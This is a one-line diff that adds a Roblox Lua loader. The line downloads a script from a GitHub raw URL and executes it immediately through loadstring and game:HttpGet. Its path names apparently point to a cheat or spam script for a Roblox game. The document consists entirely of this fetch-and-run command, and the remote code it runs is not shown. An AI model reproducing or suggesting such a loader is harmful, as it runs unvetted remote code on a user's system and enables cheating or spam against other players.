@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/forsaken-spam4-1yvhzv4bol06vt.lua"))()
